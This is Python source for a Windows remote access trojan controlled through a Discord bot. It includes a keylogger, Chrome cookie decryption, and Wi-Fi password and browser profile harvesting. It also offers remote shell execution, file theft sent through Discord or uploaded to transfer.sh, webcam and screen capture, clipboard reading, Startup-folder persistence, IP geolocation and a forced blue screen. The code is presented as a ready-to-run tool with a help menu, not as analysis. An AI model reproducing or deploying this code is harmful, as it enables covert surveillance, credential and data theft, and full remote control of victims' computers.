from time import sleep
import discord
from discord.ext import commands
import pyautogui
import requests
import base64
import threading
import os
import json
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from keyboard import read_event
from subprocess import call
from zipfile import ZipFile
import shutil
import pyperclip
import ctypes
import cv2
import time
import numpy as np
import mss
import time
from screeninfo import get_monitors
from PIL import Image
import hashlib
from discord.ext import commands
from urllib.request import urlopen
import re
recording = False
record_thread = None
filename = "screen_capture.mp4"
def start(token, ServerID, UserID):
    try:
        hshfasudf = token
        bot = commands.Bot(command_prefix="!")

        def gensesion():
            global sesja
            pc_name = os.getenv("COMPUTERNAME") or "unknown"
            sesja = str(int(hashlib.md5(pc_name.encode()).hexdigest(), 16) % 10000)

        gensesion()

        def get_public_ip():
            global ipaddres
            response = requests.get("http://checkip.amazonaws.com")
            ipaddres = response.text.strip()
        get_public_ip()

        def grab_info():
            zipObj = ZipFile('log.zip', 'w')
            os.system("ipconfig /displaydns > net_log.txt")
            os.system("netsh wlan show profile * key=clear >> net_log.txt")
            os.system("arp -a >> net_log.txt")
            os.system("ipconfig /all >> net_log.txt")
            os.system("systeminfo > hardware_log.txt")
            os.system("set >> system_log.txt")
            os.system("net user >> system_log.txt")
            os.system("net accounts >> system_log.txt")
            os.system("mkdir chrome")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default" chrome')
            zipObj.write('net_log.txt')
            zipObj.write('hardware_log.txt')
            zipObj.write('system_log.txt')
            for root, dirs, files in os.walk('chrome'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q chrome && rd chrome")
            os.system("mkdir edge")
            os.system(r'copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default" edge')
            for root, dirs, files in os.walk('edge'):
                for file in files:
                    zipObj.write(os.path.join(root, file))
            os.system("del /F /Q edge && rd edge")
            os.system("del net_log.txt")
            os.system("del hardware_log.txt")
            os.system("del system_log.txt")
            zipObj.close()


        log = ""
        def keyloggerSTART():
            global log
            while True:
                    event = read_event()
                    if event.event_type == 'down' and len(event.name) == 1 or event.name == 'space' or event.name == 'enter' or event.name == 'backspace':
                        if event.name == 'space':
                            event.name = " "
                        else:
                            if event.name == 'enter':
                                event.name = '[Enter]'
                            else:
                                if event.name == 'backspace':
                                    event.name = '[Backspace]'
                        log += event.name
        
        def cookieSteal():
            conn = sqlite3.connect(f'{os.path.expanduser("~")}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies')
            cursor = conn.cursor()
            logs_file = open("c.txt", "w")
            with open(os.getenv("APPDATA") + "/../Local/Google/Chrome/User Data/Local State", 'r', encoding="utf-8") as file:
                encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
                encrypted_key = base64.b64decode(encrypted_key)
                encrypted_key = encrypted_key[5:]
                decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            cursor.execute('SELECT host_key, name, value, encrypted_value from cookies')
            for host_key, name, value, encrypted_value in cursor.fetchall():
                try:
                    cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
                    decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:])
                except:
                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode('utf-8') or value or "0"
                cookie =  "Host Key:", host_key + " " + "Name:", name + " " + "Value:", decrypted_value.decode('utf-8') + " \n"
                logs_file.writelines(cookie)
            conn.close()

        @bot.event
        async def on_ready():
            print(f"Logged in as {bot.user}")
        
            # Replace with your server ID
            guild = bot.get_guild(ServerID)
            if guild is None:
                print("Guild not found!")
                return
        
            # -------------------------------
            # 1️⃣ Check or create 'ACCESS' category
            access_category = discord.utils.get(guild.categories, name="ACCESS")
            if access_category is None:
                access_category = await guild.create_category("ACCESS")
                print("Category 'ACCESS' created!")
        
            # 2️⃣ Check or create 'main' channel inside 'ACCESS'
            main_channel = discord.utils.get(access_category.channels, name="main")
            if main_channel is None:
                main_channel = await guild.create_text_channel("main", category=access_category)
                print("Channel 'main' created in 'ACCESS' category!")
        
            # -------------------------------
            # 3️⃣ Check or create 'AGENTS' category
            agents_category = discord.utils.get(guild.categories, name="AGENTS")
            if agents_category is None:
                agents_category = await guild.create_category("AGENTS")
                print("Category 'AGENTS' created!")
        
            # 4️⃣ Check or create session channel in 'AGENTS' category
            channel_name = f"{sesja}"  # your variable, not changed
            agent_channel = discord.utils.get(agents_category.channels, name=channel_name)
            if agent_channel is None:
                agent_channel = await guild.create_text_channel(channel_name, category=agents_category)
                print(f"Channel '{channel_name}' created in 'AGENTS' category!")
        
            # 5️⃣ Send the connection message
            await agent_channel.send(f"<@{UserID}> Agent Connected")
            print(f"Message sent in '{channel_name}'!")
            print("Connection established successfully.")
            @bot.event
            async def on_message(message):
                global session
                # Ignore messages from bots
                if message.author.bot:
                    return

                # Only react to messages from the target user
                if message.author.id == UserID and message.content.strip() == "access":
                    if message.channel.name.lower() == "main":
                        session = "all"
                    else:
                        try:
                            session = sesja  # Try to convert channel name to int
                        except ValueError:
                            session = sesja  # fallback if not an integer

                    print(f"Session set to: {session}")

                # Make sure commands still work if you have them
                await bot.process_commands(message)
        @bot.command()
        async def shell(ctx, *args):
            global session
            global sesja
            session = args[0]
            output = args[1]
            command = " ".join(args[2:])
            if session == "all":
                if output == "yes":
                    out = os.popen(command).read()
                    await ctx.send(out)
                else:
                    os.system(command)
            else:
                if session == sesja:
                    if output == "yes":
                        out = os.popen(command).read()
                        await ctx.send(out)
                    else:
                        os.system(command)

        @bot.command()
        async def ss(ctx, monitor):
            global session
            global sesja
            monitor = int(monitor)
            if session == "all":
                with mss.mss() as sct:
                    monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
                    screenshot = sct.grab(monitor)
                    img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                    img.save("ss.png")
                    await ctx.send(f"Screen from {sesja}:", file=discord.File("ss.png"))
                    os.remove("ss.png")
            else:
                if session == sesja:
                    with mss.mss() as sct:
                        monitor = sct.monitors[monitor]  # choose monitor number (2 = second monitor)
                        screenshot = sct.grab(monitor)
                        img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                        img.save("ss.png")
                        await ctx.send(f"Screen from {sesja}:", file=discord.File("ss.png"))
                        os.remove("ss.png")

        @bot.command()
        async def keylogger(ctx, action):
            global session
            global sesja
            global log
            if session == "all":
                if action == "start":
                    sys = threading.Thread(target=keyloggerSTART, name="sys")
                    sys.start()
                else:
                    if action == "log":
                        await ctx.send(log)
                        log = ""
                    else:
                        if action == "stop":
                            stop_event = threading.Event()
                            stop_event.set()
                            sys.join()
                            log = ""
                            
                        
            else:
                if session == sesja:
                    if action == "start":
                        sys = threading.Thread(target=keyloggerSTART, name="sys")
                        sys.start()
                    else:
                        if action == "log":
                            await ctx.send(log)
                            log = ""
                        else:
                            if action == "stop":
                                stop_event = threading.Event()
                                stop_event.set()
                                sys.join()
                                log = ""

        @bot.command()
        async def steal(ctx, *args):
            global session
            global sesja
            file_names = " ".join(args)
            if session == "all":
                size = os.path.getsize(file_names)
                if size > 8000000:
                    with open(file_names, 'rb') as file:
                        out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                    await ctx.send(f"stolen {out.text}")
                else:
                    await ctx.send("stolen", file=discord.File(file_names))
            else:
                if session == sesja:
                    size = os.path.getsize(file_names)
                    if size > 8000000:
                        with open(file_names, 'rb') as file:
                            out = requests.put(f"https://transfer.sh/{file_names}", data=file)
                        await ctx.send(f"stolen {out.text}")
                    else:
                        await ctx.send("stolen", file=discord.File(file_names))

        @bot.command()
        async def info(ctx):
            global session
            global sesja
            if session == "all":
                grab_info()
                await ctx.send(ipaddres, file=discord.File("log.zip"))
                os.system("del log.zip")
            else:
                if session == sesja:
                    grab_info()
                    await ctx.send(ipaddres, file=discord.File("log.zip"))
                    os.system("del log.zip")
                

        @bot.command()
        async def cd(ctx, *args):
            global session, sesja
            dir = " ".join(args)
            if session == "all":
                os.chdir(dir)
            else:
                if session == sesja:
                    os.chdir(dir)

        @bot.command()
        async def up(ctx):
            global session
            global sesja
            x = 0
            if session == "all":
                while x < 100:
                    pyautogui.press('volumeup')
                    x = x + 1
            else:
                if session == sesja:
                    while x < 100:
                        pyautogui.press('volumeup')
                        x = x + 1

        @bot.command()
        async def down(ctx):
            global session
            global sesja
            x = 0
            if session == "all":
                while x < 100:
                    pyautogui.press('volumedown')
                    x = x + 1
            else:
                if session == sesja:
                    while x < 100:
                        pyautogui.press('volumedown')
                        x = x + 1

        @bot.command()
        async def delete(ctx, path):
            global session
            global sesja
            if session == "all":
                try:
                    os.remove(path)
                    await ctx.send(f"File '{path}' has been deleted.")
                except Exception as e:
                    await ctx.send(f"An error occurred: {e}")
            else:
                if session == sesja:
                    try:
                        os.remove(path)
                        await ctx.send(f"File '{path}' has been deleted.")
                    except Exception as e:
                        await ctx.send(f"An error occurred: {e}")

        @bot.command()
        async def message(ctx, *args):
            global session
            global sesja
            title = args[0]
            button = args[1]
            message = " ".join(args[2:])
            if session == "all":
                pyautogui.alert(text=message , title=title , button=button)
            else:
                if session == sesja:
                    pyautogui.alert(text=message , title=title , button=button)
                    

        @bot.command()
        async def dir(ctx):
            global session
            global sesja
            if session == "all":
                await ctx.send(os.getcwd())
                output = os.popen("dir").read()
                await ctx.send(output)
            else:
                if session == sesja:
                    await ctx.send(os.getcwd())
                    output = os.popen("dir").read()
                    await ctx.send(output)

        @bot.command()
        async def upload(ctx, link = "", filename = "file.txt"):
            global session
            global sesja
            if session == "all":
                r = requests.get(link)
                with open(filename, 'wb') as f:
                    f.write(r.content)
                await ctx.send("uploaded")
            else:
                if session == sesja:
                    r = requests.get(link)
                    with open(filename, 'wb') as f:
                        f.write(r.content)
                    await ctx.send("uploaded")

        @bot.command()
        async def click(ctx, x = "0", y = "0"):
            global session
            global sesja
            if session == "all":
                pyautogui.click(x=int(x), y=int(y))
            else:
                if session == sesja:
                    pyautogui.click(x=int(x), y=int(y))
        
        @bot.command()
        async def chrome(ctx, action):
            global session
            global sesja
            if session == "all":
                if action == "cookie":
                    cookieSteal()
                    await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
                    os.system("del c.txt")
            else:
                if session == sesja:
                    if action == "cookie":
                        cookieSteal()
                        await ctx.send(f"stolen from {sesja}", file=discord.File("c.txt"))
                        os.system("del c.txt")

        @bot.command()
        async def press(ctx, klawisz = "Enter"):
            global session
            global sesja
            if session == "all":
                pyautogui.press(klawisz)
            else:
                if session == sesja:
                    pyautogui.press(klawisz)
        
        @bot.command()
        async def cli(ctx):
            global session
            global sesja
            if session == "all":
                text = pyperclip.paste()
                await ctx.send(text)
            else:
                if session == sesja:
                    text = pyperclip.paste()
                    await ctx.send(text)
                    

        @bot.command()
        async def write(ctx, *args):
            global session
            global sesja
            if session == "all":
                pyautogui.write(" ".join(args))
            else:
                if session == sesja:
                    pyautogui.write(" ".join(args))

        @bot.command()
        async def loc(ctx):
            global session
            global sesja
            if session == "all":
                r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                await ctx.send(r.text)
            else:
                if session == sesja:
                    r = requests.get(f"http://ip-api.com/json/{ipaddres}")
                    await ctx.send(r.text)
        
        @bot.command()
        async def cdrom(ctx):
            global session
            global sesja
            if session == "all":
                call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)
            else:
                if session == sesja:
                    call("powershell -Command (New-Object -com 'WMPlayer.OCX').cdromcollection.item(0).Eject()", shell=True)

        
        @bot.command()
        async def startup(ctx, *args):
            global session
            global sesja
            appdata_path = os.path.expandvars('%appdata%')
            startupFolder = os.path.join(appdata_path, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            filePATH = " ".join(args)
            if session == "all":
                shutil.copy(filePATH, startupFolder)
            else:
                if session == sesja:
                    shutil.copy(filePATH, startupFolder)
        @bot.command()
        async def camera(ctx):
            global session
            global sesja
            if session == sesja:

                await ctx.send("Capturing image...")

                try:
                    # Open default camera (0). If you need a different device, change the index.
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
                    if not cap.isOpened():
                        await ctx.send("Could not open webcam.")
                        return

                    # Warm up camera for a short moment
                    time.sleep(0.5)

                    # Read a frame
                    ret, frame = cap.read()
                    cap.release()

                    if not ret:
                        await ctx.send("Failed to capture image from webcam.")
                        return

                    # Save to a temporary file
                    filename = "cam_capture.jpg"
                    cv2.imwrite(filename, frame)

                    # Send the file
                    await ctx.send(file=discord.File(filename))

                    # Remove the temporary file
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                    
                except Exception as e:
                    await ctx.send(f"Error capturing image: {e}")
            elif session == "all":
                await ctx.send("Capturing image...")

                try:
                    # Open default camera (0). If you need a different device, change the index.
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)  # CV2 backend for Windows; remove second arg if not on Windows
                    if not cap.isOpened():
                        await ctx.send("Could not open webcam.")
                        return

                    # Warm up camera for a short moment
                    time.sleep(0.5)

                    # Read a frame
                    ret, frame = cap.read()
                    cap.release()

                    if not ret:
                        await ctx.send("Failed to capture image from webcam.")
                        return

                    # Save to a temporary file
                    filename = "cam_capture.jpg"
                    cv2.imwrite(filename, frame)

                    # Send the file
                    await ctx.send(file=discord.File(filename))

                    # Remove the temporary file
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                    
                except Exception as e:
                    await ctx.send(f"Error capturing image: {e}")
        @bot.command()
        async def sessions(ctx):
            try:
                r = requests.get(f"http://ip-api.com/json/{ipaddres}").json()
                country = r.get("country", "Unknown")
                city = r.get("city", "Unknown")
                location_info = f"{city}, {country}"
            except:
                    location_info = "Unknown"
            await ctx.send(f"session: {sesja} | IP address: {ipaddres} | Estimated Location: {location_info}")

        @bot.command()
        async def rename(ctx, *args):
            global session
            global sesja
            if session == sesja:
                nowaSesja = " ".join(args)
                await ctx.send("session name changed " + sesja + " to " + nowaSesja)
                sesja = nowaSesja

        @bot.command()
        async def wifi(ctx, action):
            global session
            global sesja
            if session != "all" and session != sesja:
                return
            if action.lower() not in ['on', 'off']:
                await ctx.send("Invalid action. Use 'on' or 'off'.")
                return

            try:
                import subprocess
                cmd = f"powershell -Command \"(Get-NetAdapter -Name Wi-Fi).Enable{action.capitalize()}\""
                result = subprocess.run(cmd, capture_output=True, text=True, shell=True)

                if result.returncode == 0:
                    await ctx.send(f"Wi-Fi has been turned {action}.")
                else:
                    await ctx.send(f"Failed to turn Wi-Fi {action}. Error: {result.stderr}")
            except Exception as e:
                await ctx.send(f"An error occurred: {str(e)}")

        @bot.command()
        async def shutdown(ctx):
            global session
            global sesja
            if session == "all":
                os.system("shutdown /s /f /t 1")
            else:
                if session == sesja:
                    os.system("shutdown /s /f /t 1")

        @bot.command()
        async def restart(ctx):
            global session
            global sesja
            if session == "all":
                os.system("powershell.exe Restart-Computer -Force")
                await ctx.send(f"The remote system {sesja} is being restarted.")
            else:
                if session == sesja:
                    os.system("powershell.exe Restart-Computer -Force")
                    await ctx.send(f"The remote system {sesja} is being restarted.")
        
        @bot.command()
        async def wallpaper(ctx, *args):
            global session
            global sesja
            if session == "all":
                filePATH = " ".join(args)
                filePATH = os.path.abspath(filePATH)
                ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                await ctx.send(f"wallpaper changed successfully")
            else:
                if session == sesja:
                    filePATH = " ".join(args)
                    filePATH = os.path.abspath(filePATH)
                    ctypes.windll.user32.SystemParametersInfoW(20, 0, filePATH , 0)
                    await ctx.send(f"wallpaper changed successfully")
        
        @bot.command()
        async def kill(ctx, *args):
            global session
            global sesja
            if session == "all":
                task = " ".join(args)
                os.system(f"taskkill /f /im {task}")
                await ctx.send(f"task {task} killed successfull")
            else:
                if session == sesja:
                    task = " ".join(args)
                    os.system(f"taskkill /f /im {task}")
                    await ctx.send(f"task {task} killed successfull")
        
        @bot.command()
        async def bsod(ctx):
            global session
            global sesja
            if session == "all":
                ERROR_CODE = 0xDEADDEAD
                ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))
            else:
                if session == sesja:
                    ERROR_CODE = 0xDEADDEAD
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(ERROR_CODE, 0, 0, None, 6, ctypes.byref(ctypes.c_uint()))

        @bot.command()
        async def copy(ctx, source_path: str, dest_path: str):
            global session, sesja
        
            # Check session first
            if session is None:
                await ctx.send("Session not set. Use access first.")
                return
        
            if session != "all" and session != sesja:
                await ctx.send("You are not allowed to copy files in this session.")
                return
        
            try:
                # Check source exists
                if not os.path.exists(source_path):
                    await ctx.send(f"Source file does not exist: {source_path}")
                    return
        
                # Create destination directory if needed
                dest_dir = os.path.dirname(dest_path)
                if dest_dir and not os.path.exists(dest_dir):
                    os.makedirs(dest_dir)
        
                # Copy the file
                shutil.copy2(source_path, dest_path)
                await ctx.send(f"File copied successfully from {source_path} to {dest_path}")
        
            except Exception as e:
                await ctx.send(f"Failed to copy file: {str(e)}")
        def scerecord(monitor_num=1):
            global recording, filename
            filename = f"screen_capture_monitor{monitor_num}.mp4"

            with mss.mss() as sct:
                # Check monitor number validity
                if monitor_num < 1 or monitor_num >= len(sct.monitors):
                    print(f"Invalid monitor {monitor_num}, defaulting to 1")
                    monitor_num = 1

                monitor = sct.monitors[monitor_num]
                width, height = monitor["width"], monitor["height"]
                fps = 20
                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
                out = cv2.VideoWriter(filename, fourcc, fps, (width, height))

                print(f"Recording monitor {monitor_num} ({width}x{height}) at {fps} FPS...")

                last = time.time()
                while recording:
                    img = np.array(sct.grab(monitor))      # BGRA
                    frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)  # to BGR
                    out.write(frame)

                    # Simple rate limiter
                    dt = time.time() - last
                    delay = max(0, (1.0 / fps) - dt)
                    if delay:
                        time.sleep(delay)
                    last = time.time()

                out.release()
                cv2.destroyAllWindows()
                print("Stopped recording.")

        @bot.command()
        async def screenrecord(ctx, action, monitor: int = 1):
            global recording, record_thread, filename, session, sesja
            if session != sesja:
                await ctx.send("Invalid session.")
                return

            if action == "start":
                if not recording:
                    recording = True
                    record_thread = threading.Thread(target=scerecord, args=(monitor,), daemon=True)
                    record_thread.start()
                    await ctx.send(f"Started recording on monitor {monitor}.")
                else:
                    await ctx.send("Already recording.")

            elif action == "stop":
                if recording:
                    recording = False
                    record_thread.join()  # wait until thread fully stops
                    await ctx.send("Stopped recording. Sending file...")
                    try:
                        await ctx.send(file=discord.File(filename))
                    except Exception as e:
                        await ctx.send(f"Error sending file: {e}")
                    try:
                        os.remove(filename)
                    except OSError:
                        pass
                else:
                    await ctx.send("No active recording.")
        @bot.command()
        async def processes(ctx):
            global session
            global sesja
            if session == "all":
                out = os.popen("tasklist").read()
                for i in range(0, len(out), 2000):
                    await ctx.send(out[i:i+2000])
            else:
                if session == sesja:
                    out = os.popen("tasklist").read()
                    for i in range(0, len(out), 2000):
                        await ctx.send(out[i:i+2000])
        @bot.command()
        async def monitors(ctx):
            global session
            global sesja
            if session == sesja:
                monitors = get_monitors()
                await ctx.send(f"Number of monitors: {len(monitors)}")
            else:
                monitors = get_monitors()
                await ctx.send(f"Number of monitors for session {sesja}: {len(monitors)}")
        @bot.command()
        async def h(ctx):
            wiadomosc = '''
        !bsod - Shows a Blue Screen of Death (BSOD) on the remote computer.
        !cd [path] - Changes the current folder on the remote computer.
        !cdrom - Opens the CD/DVD drive.
        !chrome [action(cookie)] - Retrieves selected information from Chrome.
        !cli - Copies the contents of the clipboard from the remote computer.
        !click [x] [y] - Clicks on a specific location on the screen.
        !delete [path] - Deletes a file from the remote computer.
        !dir - Shows the files and folders in the current directory.
        !down - Lowers the volume on the remote computer.
        !info - Shows system information about the remote computer.
        !keylogger [action(start, stop, log)] - Starts, stops, or views a keylogger.
        !kill [task] - Stops a specific running program.
        !loc - Shows IP and location information.
        !message [title] [button] [message] - Displays a pop-up message on the remote computer.
        !press [key] - Presses a key on the remote computer keyboard.
        !rename [new_name] - Changes the name of the current session.
        !restart - Restarts the remote computer.
        !shell [output(yes, no)] [command] - Runs a command on the remote computer.
        !sessions - Shows all active sessions.
        !shutdown - Turns off the remote computer.
        !ss [monitor] - Takes a screenshot of the remote computer screen.
        !startup [file path] - Adds a program to start automatically when the computer turns on.
        !steal [file_names] - Copies files from the remote computer.
        !up - Increases the volume on the remote computer.
        !upload [link] [file_name] - Sends a file to the remote computer.
        !wallpaper [path] - Changes the wallpaper on the remote computer.
        !wifi [on/off] - Turns the Wi-Fi on or off.
        !write [message] - Types a message on the remote computer.
        !camera - Takes a picture using the remote computer's camera.
        !copy [source_file] [destination_path] - Copies a file to another location.
        !processes - Lists all running processes.
        !screenrecord [action(start, stop)] [monitor] - Sends a screen record of the computer.
        !monitors - Reveals how many monitors does the computer have
            '''
            for i in range(0, len(wiadomosc), 2000):
                await ctx.send(wiadomosc[i:i+2000])
        bot.run(hshfasudf)
    except Exception as e:
        print(f"Error: {e}")
        sleep(5)

